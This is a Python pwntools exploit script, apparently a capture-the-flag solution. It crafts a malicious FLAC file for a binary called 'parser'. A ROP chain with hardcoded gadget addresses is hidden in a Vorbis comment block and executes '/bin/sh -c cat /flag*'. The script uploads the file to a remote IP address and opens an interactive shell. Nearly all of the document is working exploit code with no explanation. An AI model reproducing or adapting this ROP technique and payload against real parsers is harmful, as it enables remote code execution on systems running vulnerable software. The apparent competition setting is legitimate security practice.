from pwn import *
from os import system
import struct
import random

context.aslr = False
elf = ELF("./parser")
# streaminfo = 0
# padding = 1
# application = 2
# seektable = 3
# vorbis_comment = 4
# cuesheet = 5
# picture = 6

# context.terminal = ["gnome-terminal","--"]
def pack_big24(value):
    return value.to_bytes(3, 'big')

def pack_big32(value):
    return value.to_bytes(4, 'big')

def create_block_header(block_type, is_last, size):
    flags = (block_type & 0x7F) | (0x80 if is_last else 0x00)
    return bytes([flags]) + pack_big24(size)

def create_streaminfo_block(is_last):
    block_data = bytearray()
    
    block_data.extend(struct.pack(">H", 4096))  # min bsize
    block_data.extend(struct.pack(">H", 4096))  # max bsize
    block_data.extend(pack_big24(255))  # min fsize
    block_data.extend(pack_big24(65535))  # max fsize
    
    sample_rate = 44100
    channels = 2  # == 3 channels
    bits_per_sample = 23  # == 24 bits per sample
    total_samples_high = 0
    combined = (sample_rate << 12) | (channels << 9) | (bits_per_sample << 4) | total_samples_high
    block_data.extend(struct.pack(">I", combined))
    
    total_samples_low = 1000000
    block_data.extend(struct.pack(">I", total_samples_low))
    
    block_data.extend(bytes.fromhex("ffe5d100c63f5188900c66b6a6a08ce2"))  # bs
    
    header = create_block_header(0, is_last, len(block_data))
    return header + block_data

def create_padding_block(is_last):
    padding_length = 1024
    block_data = b'\x00' * padding_length
    header = create_block_header(1, is_last, padding_length)
    return header + block_data

def create_application_block(id, is_last):
    block_data = pack_big32(id) + b'\xff'*0x100 + random.randbytes(16)
    header = create_block_header(2, is_last, len(block_data))
    return header + block_data

def create_seektable_block(data_list, is_last):
    block_data = bytearray()

    for i in data_list:
        block_data.extend(struct.pack(">Q", i[0]))
        block_data.extend(struct.pack(">Q", i[1]))
        block_data.extend(struct.pack(">H", i[2]))

    header = create_block_header(3, is_last, len(block_data))
    return header + block_data

def create_vorbis_comment_block(comment, is_last):
    block_data = bytearray()
    block_data.extend(struct.pack("<I", len(comment)))
    block_data.extend(comment)
    comments = [b"comment1", b"comment2"]*1
    block_data.extend(struct.pack("<I", len(comments)))
    for comment in comments:
        block_data.extend(struct.pack("<I", len(comment)))
        block_data.extend(comment)
    header = create_block_header(4, is_last, len(block_data))
    return header + block_data

def create_picture_block(is_last):
    block_data = bytearray()
    block_data.extend(struct.pack(">I", 1))  # Picture type (Cover (front))
    mime_type = b"JUNKJUNK"
    block_data.extend(struct.pack(">I", len(mime_type)))
    block_data.extend(mime_type)
    description = b"JUNKJUNK"
    block_data.extend(struct.pack(">I", len(description)))
    block_data.extend(description)
    block_data.extend(struct.pack(">I", 200))   # width
    block_data.extend(struct.pack(">I", 200))   # height
    block_data.extend(struct.pack(">I", 24))    # depth
    block_data.extend(struct.pack(">I", 0))     # no of colors (0 for true color)
    picture_data = random.randbytes(200)        # random stuff
    block_data.extend(struct.pack(">I", len(picture_data)))
    block_data.extend(picture_data)
    header = create_block_header(6, is_last, len(block_data))
    return header + block_data

poprdi = 0x000000000040591d
poprsi = 0x00000000004073a3
poprdxrbx = 0x0000000000533dab
poprax = 0x000000000042111a
syscall = 0x00000000004a7fd9

def create_flac_file():
    flac_data = bytearray()

    flac_data.extend(b"fLaC")

    streaminfo = create_streaminfo_block(is_last=False)
    flac_data.extend(streaminfo)

    seektable = create_seektable_block([[0xdead, 0xbeef, 2]], is_last=False)
    flac_data.extend(seektable)

    comment = create_vorbis_comment_block(b"JUNK"*2, is_last=False)
    flac_data.extend(comment)

    seektable = create_seektable_block([[0x41, 0x5dc118, 0x1000]], is_last=False)
    flac_data.extend(seektable)

    ret = 0x475957
    binsh = 0x5dc120
    argv = binsh+ 0x8
    
    payload = p64(ret) + p64(poprdi) + p64(binsh) + p64(poprsi) + p64(0x0) + p64(poprdxrbx) + p64(0x0) + p64(0x0) + p64(poprsi) + p64(argv) + p64(poprax) + p64(0x3b) + p64(syscall)
    comment = create_vorbis_comment_block(p64(0x47594e)+ b"/bin/sh\x00" + (p64(binsh) + p64(binsh + 0x28) + p64(binsh+0x30) + p64(0x0) + b'-c'.ljust(8, b'\x00') + b"cat /flag*\x00\x00" + b'-c\x00').ljust(0x740,b"A") + payload, is_last=True)
    flac_data.extend(comment)

    return flac_data
    
with open("exploit.flac", "wb") as f:
    f.write(create_flac_file())

log.info("crafted exploit.flac")

# p = process(['./parser', 'exploit.flac'])

# p = gdb.debug(['./parser','./exploit.flac'], '''
#     rb parseBlockSeekTable
#     b *0x475957
#     c
# ''')

p = remote("3.255.127.32", 30682)
context.log_level = 'debug'

print(p.readuntil("solution"))

j = open("exploit.flac", "rb")
data = j.read()

blah = input("enter pow solution: ")
p.sendline(blah)

p.sendlineafter(b"Size: ", str(len(data)).encode())
p.sendlineafter(b"File: ", data)
p.interactive()

# execve("/bin/sh", {"/bin/sh", "cat /flag*", NULL}, NULL);

p.interactive()

'''
0x15608
'''